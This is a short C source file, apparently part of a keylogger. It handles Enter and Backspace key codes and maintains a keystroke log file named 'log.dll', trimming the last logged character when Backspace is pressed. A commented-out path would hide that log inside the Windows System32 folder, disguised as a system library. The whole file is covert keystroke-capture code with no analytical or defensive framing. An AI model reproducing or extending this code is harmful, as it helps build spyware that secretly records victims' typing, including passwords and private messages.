#include "zones.h"

short zone5(int key_value, keyboard_struct kb_status)
{
	if (key_value == 13)
		return ('\n');
	else if (key_value == 8)
		return (z5_supp(key_value)); // 215  
	else
		return (0);
}

short z5_supp(int key_value)
{
	FILE *fichier;
	t_str *s_read = NULL;
	char *read = NULL;
	char *line = NULL;
	int i;
	int end;

	i = 0;

	line = (char *)malloc(sizeof(wchar_t) * 200);
	//fichier = fopen("C:\\Windows\\System32\\log.dll", "r");
	fichier = fopen("log.dll", "r");
	if (fichier)
	{
		while (fgets(line, 200, fichier) != NULL)
			s_read = add_str(s_read, line, 0);
		end = cpt_index(s_read);
		if (end > 3)
		{
			read = export_str(s_read);
			s_read = free_list(s_read);
			if (read[end - 2] != '\n' || read[end - 3] != '-')
			{
				read[end - 1] = 0;
				fichier = freopen("log.dll", "w", fichier);
				fputs(read, fichier);
				free(read);
				free(line);
				fclose(fichier);
				return (0);
			}
			free(read);
		}
		fclose(fichier);
		free_list(s_read);
	}
	free(line);	
	return (215);
}
